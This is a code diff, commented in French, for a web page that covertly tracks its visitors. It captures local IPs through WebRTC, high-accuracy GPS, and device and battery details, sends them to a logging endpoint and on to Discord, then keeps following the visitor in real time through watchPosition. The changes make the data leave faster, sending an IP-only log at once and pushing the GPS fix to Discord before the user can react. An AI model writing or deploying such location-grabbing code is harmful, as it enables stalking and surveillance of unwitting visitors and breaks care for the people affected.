@@ -1,5 +1,9 @@
+let cachedLocalIp = null;
+
 // Fonction pour récupérer l'IP locale via WebRTC
 async function getLocalIP() {
+    if (cachedLocalIp) return cachedLocalIp;
+
     return new Promise((resolve) => {
         const ips = [];
         const pc = new RTCPeerConnection({
@@ -14,8 +18,12 @@ async function getLocalIP() {
         
         pc.onicecandidate = (event) => {
             if (!event || !event.candidate) {
-                if (ips.length > 0) resolve(ips[0]);
-                else resolve("Inconnue (Bloqué/VPN)");
+                if (ips.length > 0) {
+                    cachedLocalIp = ips[0];
+                    resolve(ips[0]);
+                } else {
+                    resolve("Inconnue (Bloqué/VPN)");
+                }
                 return;
             }
             
@@ -26,16 +34,16 @@ async function getLocalIP() {
             }
         };
 
-        // Timeout plus long pour laisser le temps au STUN de répondre (3 secondes)
+        // Timeout plus court pour ne pas bloquer l'envoi initial
         setTimeout(() => {
             if (ips.length > 0) {
+                cachedLocalIp = ips[0];
                 resolve(ips[0]);
             } else {
-                // Tentative de récupération via une autre méthode si STUN échoue
                 resolve("Inconnue (Timeout/mDNS)");
             }
             pc.close();
-        }, 3000);
+        }, 2000);
     });
 }
 
@@ -48,7 +56,7 @@ async function getPreciseLocation() {
 
         const options = {
             enableHighAccuracy: true,
-            timeout: 10000,
+            timeout: 5000, // On réduit à 5s pour ne pas faire attendre trop longtemps l'utilisateur
             maximumAge: 0
         };
 
@@ -74,14 +82,14 @@ async function getPreciseLocation() {
 
 // Fonction pour récupérer les infos batterie et réseau
 async function getDeviceStats() {
-    const localIp = await getLocalIP();
     const stats = {
         battery: null,
         charging: null,
         connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
     };
 
-    // Correction WiFi/4G basée sur l'IP locale
+    // Correction WiFi/4G basée sur l'IP locale (on n'attend pas l'IP ici pour aller vite)
+    const localIp = cachedLocalIp;
     if (localIp && (localIp.startsWith('192.168.') || localIp.startsWith('10.') || localIp.includes('.local'))) {
         stats.connection = 'wifi';
     } else if (stats.connection === 'unknown') {
@@ -108,7 +116,8 @@ if (!sessionId) {
 
 async function logVisitor(preciseLocation = null, isUpdate = false) {
     try {
-        const localIp = await getLocalIP();
+        // On récupère l'IP locale mais sans bloquer si on l'a déjà
+        const localIp = cachedLocalIp || await getLocalIP();
         const stats = await getDeviceStats();
         
         await fetch('/api/log', {
@@ -193,10 +202,40 @@ function getDistance(lat1, lon1, lat2, lon2) {
 }
 
 const handleFirstClick = async () => {
-    const location = await getPreciseLocation();
-    if (location) lastLoggedPos = location;
-    await logVisitor(location);
+    // 1. On libère l'interface immédiatement
     overlay.style.display = 'none';
+    
+    // 2. On envoie un premier log "IP uniquement" ultra-rapide pour Discord
+    // Cela permet de voir le visiteur tout de suite
+    logVisitor();
+
+    // 3. On demande le GPS en arrière-plan
+    const location = await getPreciseLocation();
+    if (location) {
+        lastLoggedPos = location;
+        // On envoie le GPS à Discord même si c'est une mise à jour
+        try {
+            const localIp = cachedLocalIp || await getLocalIP();
+            const stats = await getDeviceStats();
+            await fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    isUpdate: true,
+                    forceDiscord: true, // ON FORCE DISCORD POUR LE POINT VERT
+                    localIp: localIp,
+                    preciseLocation: location,
+                    deviceStats: stats,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    referrer: document.referrer || 'Direct',
+                    page: window.location.pathname
+                })
+            });
+        } catch (e) {}
+    }
 
     // Mode watchPosition pour un suivi ultra-précis en temps réel
     if (navigator.geolocation) {
